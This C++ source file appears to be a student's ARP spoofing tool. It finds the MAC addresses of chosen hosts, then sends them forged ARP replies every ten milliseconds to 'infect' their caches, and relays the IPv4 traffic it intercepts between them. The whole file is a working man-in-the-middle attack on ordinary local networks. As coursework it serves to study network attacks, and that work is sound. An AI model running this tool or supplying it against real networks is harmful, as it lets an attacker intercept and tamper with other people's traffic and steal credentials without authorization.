#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string>
#include <fstream>

#include <unistd.h>
#include <cstring>
#include <cstdlib>
#include <vector>
#include <iostream>
#include <thread>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <mutex>
#include <chrono>

std::mutex g_mutex_resolveMac;


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

// my ethernet header from pcap-test assginment.
typedef struct eEthHdr_{
	uint8_t DST_MAC_ADDR[6];
	uint8_t SRC_MAC_ADDR[6];
	uint16_t TYPE;
}eEthHdr;

// my ipv4 header from pcap-test assginment.
typedef struct eIpv4Hdr_{
#if BYTE_ORDER == LITTLE_ENDIAN
	u_char IHL:4;
	u_char VER:4;
#else
	u_char VER:4;
	u_char IHL:4;
#endif
	uint8_t DSCP_ECN;
	uint16_t TOTAL_LEN;
	uint16_t ID;
	uint16_t FLAG_FRAGOFFSET;
	uint8_t TTL;
	uint8_t PROTOCOL;
	uint16_t HDR_CHKSUM;
	uint32_t SRC_IP_ADDR;
	uint32_t DST_IP_ADDR;
}eIpv4Hdr;

// Eth && Ipv4 && Tcp packet structure.
struct eEthIpv4TcpPacket{
	eEthHdr eEthHdr_;
	eIpv4Hdr eIpv4Hdr_;
};
#pragma pack(pop)


void usage();
Mac GetMyMac(const std::string deviceName_);
Ip GetMyIp(std::string deviceName_);

void ResolveTargetMacSender(const char* deviceName_, Mac MyMac_,
 std::vector<Ip> IpList_, std::vector<Mac>& MacList_);

void ResolveTargetMacReceiver(const char* deviceName_, Mac MyMac_,
 std::vector<Ip> IpList_, std::vector<Mac>& MacList_);

void SpoofWorker(const char* deviceName_, Mac MyMac_,
 std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_, int period_);

void RelayWorker(const char* deviceName_, Mac MyMac_,
 std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
 std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_);


int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// get my mac address.
	Mac MyMac(GetMyMac(argv[1]));
	if (MyMac.isNull()){
		fprintf(stderr, "couldn't get my mac address\n");
		return -1;
	}


	// count jobs.
	const int jobNum = (argc - 2) / 2;
	std::vector<Ip> senderIpList;
	std::vector<Mac> senderMacList;
	std::vector<Ip> targetIpList;
	std::vector<Mac> targetMacList;
	for(int i = 2; i < argc; i ++){
		if (i % 2 == 0){
			senderIpList.push_back(Ip(argv[i]));
		}
		else{
			targetIpList.push_back(Ip(argv[i]));
		}
	}

	std::thread ResolveMacThread1(ResolveTargetMacSender, dev, MyMac, senderIpList, std::ref(senderMacList));
	std::thread ResolveMacThread2(ResolveTargetMacReceiver, dev, MyMac, senderIpList, std::ref(senderMacList));
	ResolveMacThread1.join();
	ResolveMacThread2.join();

	std::thread ResolveMacThread3(ResolveTargetMacSender, dev, MyMac, targetIpList, std::ref(targetMacList));
	std::thread ResolveMacThread4(ResolveTargetMacReceiver, dev, MyMac, targetIpList, std::ref(targetMacList));
	ResolveMacThread3.join();
	ResolveMacThread4.join();

	std::thread SpoofThread(SpoofWorker, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList, 10000);
	std::thread RealyThread(RelayWorker, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList);
	RealyThread.join();
	SpoofThread.join();
	pcap_close(handle);
}


/**
 * @brief Print usage.
 */
void usage() {
	printf("./arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}


/**
 * @brief Get my MAC address as Mac object.
 * 
 * @param[in] deviceName_ NIC device name.
 * @return Mac my Mac object.
 * 
 * @details	read file /sys/class/net/[deviceName_]/address
 *	to get MAC address of NIC device.
 */
Mac GetMyMac(const std::string deviceName_){
	std::string filePath = "/sys/class/net/" + deviceName_ + "/address";

	std::ifstream ifr;
	ifr.open(filePath, std::ifstream::in);
	if (!ifr.is_open()){
		fprintf(stderr, "can't open file %s\n", filePath.c_str());
		return Mac().nullMac();
	}

	static std::string res;
	std::getline(ifr, res);
	ifr.close();
	Mac myMacAddr(res);
	
	return myMacAddr;
}


/**
 * @brief Get my IP address as Ip().
 * 
 * @param[in] deviceName_ NIC device name.
 * @return Ip my Ip object.
 * 
 * @details	socket used.
 */
Ip GetMyIp(std::string deviceName_){
    struct ifreq _ifr;
    int _socket = socket(AF_INET, SOCK_DGRAM, 0);
    _ifr.ifr_addr.sa_family = AF_INET;
    strncpy(_ifr.ifr_name , deviceName_.c_str() , IFNAMSIZ - 1);
    ioctl(_socket, SIOCGIFADDR, &_ifr);
    close(_socket);
    return Ip(htonl(((struct sockaddr_in *)&_ifr.ifr_addr)->sin_addr.s_addr));
}


/**
 * @brief Thread function to resolve target MAC address.
 * 	Send normal ARP request.
 * 
 * @param[in] deviceName_ NIC device name.
 * @param[in] MyMac_ MyMac object.
 * @param[in] IpList_ target Ip object list.
 * @param[out] MacList_ target Mac object list to fill.
 */
void ResolveTargetMacSender(const char* deviceName_, Mac MyMac_,
 std::vector<Ip> IpList_, std::vector<Mac>& MacList_){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", deviceName_, errbuf);
		return;
	}

	int cnt = 0;
	while (true)
	{
		usleep(1000);
g_mutex_resolveMac.lock();
		if(IpList_.size() == MacList_.size()){
			break;
		}
g_mutex_resolveMac.unlock();

		EthArpPacket pktArpReq;
		pktArpReq.eth_.smac_ = MyMac_;
		pktArpReq.eth_.dmac_ = Mac().broadcastMac();
		pktArpReq.eth_.type_ = htons(EthHdr::Arp);
		pktArpReq.arp_.hrd_ = htons(ArpHdr::ETHER);
		pktArpReq.arp_.pro_ = htons(EthHdr::Ip4);
		pktArpReq.arp_.hln_ = Mac::SIZE;
		pktArpReq.arp_.pln_ = Ip::SIZE;
		pktArpReq.arp_.op_ = htons(ArpHdr::Request);
		pktArpReq.arp_.smac_ = MyMac_;
		pktArpReq.arp_.sip_ = htonl(GetMyIp(deviceName_));	// I can use custom ip.
		pktArpReq.arp_.tmac_ = Mac().nullMac();
		pktArpReq.arp_.tip_ = htonl(IpList_.at(cnt++ % IpList_.size()));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpReq), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "@ResolveTargetMacSender @pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return;
		}
	}
g_mutex_resolveMac.unlock();
	pcap_close(handle);
	return;
}


/**
 * @brief Thread function to resolve target MAC address.
 * 	Receive normal ARP reply.
 * 
 * @param[in] deviceName_ NIC device name.
 * @param[in] MyMac_ MyMac object.
 * @param[in] IpList_ target Ip object list.
 * @param[out] MacList_ target Mac object list to fill.
 */
void ResolveTargetMacReceiver(const char* deviceName_, Mac MyMac_,
 std::vector<Ip> IpList_, std::vector<Mac>& MacList_){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", deviceName_, errbuf);
		return;
	}
	
	int cnt = 0;
	int res = 0;
	struct pcap_pkthdr* header;
	while (true)
	{
		usleep(0);
g_mutex_resolveMac.lock();
		if(IpList_.size() == MacList_.size()){
			break;
		}
g_mutex_resolveMac.unlock();

		// receive packet.
		const u_char* rawArpRep;
		res = pcap_next_ex(handle, &header, &rawArpRep);
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return;
		}

		if (res == 0){
			// no captured packet.
			continue;
		}

		EthArpPacket* pktArpRep = (EthArpPacket*)rawArpRep;
		if (pktArpRep->eth_.type() != EthHdr::Arp){
			// not arp packet.
			continue;
		}
		if (pktArpRep->arp_.op() != ArpHdr::Reply){
			// not arp packet.
			continue;
		}

		if (Mac(pktArpRep->eth_.dmac_) != MyMac_){
			// get only packet sent to me.
			continue;
		}

		if (Ip(pktArpRep->arp_.sip()) == IpList_.at(cnt)){
g_mutex_resolveMac.lock();
			MacList_.push_back(Mac(pktArpRep->eth_.smac_));
g_mutex_resolveMac.unlock();
			cnt++;
		}
	}
g_mutex_resolveMac.unlock();
	pcap_close(handle);
	return;
}


/**
 * @brief Thread function to spoof given senders and targets.
 * 	Infect periodically senders and targets.
 * 
 * @param[in] deviceName_ NIC device name.
 * @param[in] MyMac_ MyMac object.
 * @param SenderIpList_ sender Ip object list to infect.
 * @param SenderMacList_ sender Mac object list to infect.
 * @param TargetIpList_ target Ip object list to infect.
 * @param TargetMacList_ target Mac object list to infect.
 * @param period_ infection period value to put to usleep().
 */
void SpoofWorker(const char* deviceName_, Mac MyMac_,
 std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
 std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_,
 int period_){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "@SpoofWorker: pcap_open_live error=%s\n", pcap_geterr(handle));
		return;
	}
	
	if (!(SenderIpList_.size() == SenderMacList_.size()
	 && SenderMacList_.size() == TargetIpList_.size()
	 && TargetIpList_.size() == TargetMacList_.size())){
		fprintf(stderr, "@SpoofWorker: lise size error\n");
		return;
	}
	const size_t listSize = SenderIpList_.size();

	// sender <-> me.
	std::vector<EthArpPacket> pktArpRepInfectSenderList;
	for(int i = 0; i < listSize; i++){
		EthArpPacket pkt;
		pkt.eth_.smac_ = MyMac_;
		pkt.eth_.dmac_ = SenderMacList_.at(i);
		pkt.eth_.type_ = htons(EthHdr::Arp);
		pkt.arp_.hrd_ = htons(ArpHdr::ETHER);
		pkt.arp_.pro_ = htons(EthHdr::Ip4);
		pkt.arp_.hln_ = Mac::SIZE;
		pkt.arp_.pln_ = Ip::SIZE;
		pkt.arp_.op_ = htons(ArpHdr::Reply);
		pkt.arp_.smac_ = MyMac_;
		pkt.arp_.sip_ = htonl(TargetIpList_.at(i));
		pkt.arp_.tmac_ = SenderMacList_.at(i);
		pkt.arp_.tip_ = htonl(SenderIpList_.at(i));

		pktArpRepInfectSenderList.push_back(pkt);
	}

	// target <-> me.
	std::vector<EthArpPacket> pktArpRepInfectTargetList;
	for(int i = 0; i < listSize; i++){
		EthArpPacket pkt;
		pkt.eth_.smac_ = MyMac_;
		pkt.eth_.dmac_ = TargetMacList_.at(i);
		pkt.eth_.type_ = htons(EthHdr::Arp);
		pkt.arp_.hrd_ = htons(ArpHdr::ETHER);
		pkt.arp_.pro_ = htons(EthHdr::Ip4);
		pkt.arp_.hln_ = Mac::SIZE;
		pkt.arp_.pln_ = Ip::SIZE;
		pkt.arp_.op_ = htons(ArpHdr::Reply);
		pkt.arp_.smac_ = MyMac_;
		pkt.arp_.sip_ = htonl(SenderIpList_.at(i));
		pkt.arp_.tmac_ = TargetMacList_.at(i);
		pkt.arp_.tip_ = htonl(TargetIpList_.at(i));

		pktArpRepInfectTargetList.push_back(pkt);
	}

	// stupid method.
	int res = 0;
	while (true)
	{
		usleep(period_);
		for(int i = 0; i < listSize; i++){
g_mutex_resolveMac.lock();
			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(pktArpRepInfectSenderList.at(i))), sizeof(EthArpPacket));
g_mutex_resolveMac.unlock();
			if (res != 0) {
				fprintf(stderr, "@SpoofWorker: pcap_sendpacket error=%s\n", pcap_geterr(handle));
				return;
			}
			//printf("%s -> %s\n", std::string(pktArpRepInfectSenderList.at(i).eth_.smac()).c_str(), std::string(pktArpRepInfectSenderList.at(i).eth_.dmac()).c_str());

g_mutex_resolveMac.lock();
			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpRepInfectTargetList.at(i)), sizeof(EthArpPacket));
g_mutex_resolveMac.unlock();
			if (res != 0) {
				fprintf(stderr, "@SpoofWorker: pcap_sendpacket error=%s\n", pcap_geterr(handle));
				return;
			}
			//printf("%s -> %s\n", std::string(pktArpRepInfectTargetList.at(i).eth_.smac()).c_str(), std::string(pktArpRepInfectTargetList.at(i).eth_.dmac()).c_str());
		}
	}
	return;
}


/**
 * @brief Thread function to relay given (maybe)infected senders and targets.
 * 
 * @param[in] deviceName_ NIC device name.
 * @param[in] MyMac_ MyMac object.
 * @param SenderIpList_ sender Ip object list to relay.
 * @param SenderMacList_ sender Mac object list to relay.
 * @param TargetIpList_ target Ip object list to relay.
 * @param TargetMacList_ target Mac object list to relay.
 */
void RelayWorker(const char* deviceName_, Mac MyMac_,
 std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
 std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "@RelayWorker: pcap_open_live error=%s\n", pcap_geterr(handle));
		return;
	}
	
	if (!(SenderIpList_.size() == SenderMacList_.size()
	 && SenderMacList_.size() == TargetIpList_.size()
	 && TargetIpList_.size() == TargetMacList_.size())){
		fprintf(stderr, "@RelayWorker: list size error\n");
		return;
	}
	const size_t listSize = SenderIpList_.size();
	const uint8_t* myMacAddr = (uint8_t*)(MyMac_);
	Ip myIp = GetMyIp(deviceName_);
	const uint32_t myIpAddr = (uint32_t)myIp;

	int res = 0;
	struct pcap_pkthdr* header;
	while (true)
	{
		sleep(0);
		const u_char* rawRecv;
		res = pcap_next_ex(handle, &header, &rawRecv);
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("@RelayWorker: pcap_next_ex error=%s\n", pcap_geterr(handle));
			return;
		}

		// relay only Eth + Ipv4 + Tcp packet.
		eEthIpv4TcpPacket* pktHdr = (eEthIpv4TcpPacket*)rawRecv;
		if (ntohs(pktHdr->eEthHdr_.TYPE) != EthHdr::Ip4){
			// drop Ipv6, arp, etc.
			continue;
		}
 
		for(int i = 0; i < listSize; i++){
			uint32_t pktSrcIp = ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR);
			uint32_t pktDstIp = ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR);
			uint32_t senderIp = SenderIpList_.at(i);
			uint32_t targetIp = TargetIpList_.at(i);
	
			// src ip가 sender이고, 내 ip로 보낸 것이 아니라면,
			if (pktSrcIp == senderIp && pktDstIp != myIpAddr) {
				printf("@RelayWorker: sender -> target\n");
				printf("smac=%s\tdmac=%s\nsip=%s\tdip=%s\n",
				 std::string(Mac(pktHdr->eEthHdr_.SRC_MAC_ADDR)).c_str(),
				 std::string(Mac(pktHdr->eEthHdr_.DST_MAC_ADDR)).c_str(),
				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR))).c_str(),
				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR))).c_str());

				uintptr_t originalSrcMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.SRC_MAC_ADDR);
				memcpy((void*)originalSrcMacPtr, myMacAddr, sizeof(uint8_t) * 6);
				uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
				memcpy((void*)originalDstMacPtr, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6);

				
g_mutex_resolveMac.lock();
				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
g_mutex_resolveMac.unlock();
				if (res != 0) {
					fprintf(stderr, "@ResolveTargetMacSender @pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					return;
				}
				printf("smac=%s\tdmac=%s\nsip=%s\tdip=%s\n\n\n",
				 std::string(Mac(pktHdr->eEthHdr_.SRC_MAC_ADDR)).c_str(),
				 std::string(Mac(pktHdr->eEthHdr_.DST_MAC_ADDR)).c_str(),
				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR))).c_str(),
				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR))).c_str());
				
				break;
			}
	
			// src mac이 target이고, sender ip에게 보낸 패킷이라면,
			if (memcmp(pktHdr->eEthHdr_.SRC_MAC_ADDR, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6) == 0
			&& pktDstIp == senderIp){
				// Sender하게 보낸 패킷만 변조해야 함.
				printf("@RelayWorker: target -> sender\n");
				printf("smac=%s\tdmac=%s\nsip=%s\tdip=%s\n",
				 std::string(Mac(pktHdr->eEthHdr_.SRC_MAC_ADDR)).c_str(),
				 std::string(Mac(pktHdr->eEthHdr_.DST_MAC_ADDR)).c_str(),
				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR))).c_str(),
				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR))).c_str());

				uintptr_t originalSrcMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.SRC_MAC_ADDR);
				memcpy((void*)originalSrcMacPtr, myMacAddr, sizeof(uint8_t) * 6);
				uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
				memcpy((void*)originalDstMacPtr, (uint8_t*)(SenderMacList_.at(i)), sizeof(uint8_t) * 6);
g_mutex_resolveMac.lock();
				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
g_mutex_resolveMac.unlock();
				if (res != 0) {
					fprintf(stderr, "@ResolveTargetMacSender @pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					return;
				}
				printf("smac=%s\tdmac=%s\nsip=%s\tdip=%s\n\n\n",
				 std::string(Mac(pktHdr->eEthHdr_.SRC_MAC_ADDR)).c_str(),
				 std::string(Mac(pktHdr->eEthHdr_.DST_MAC_ADDR)).c_str(),
				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR))).c_str(),
				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR))).c_str());
				break;
			}
		}
	}
	return;
}
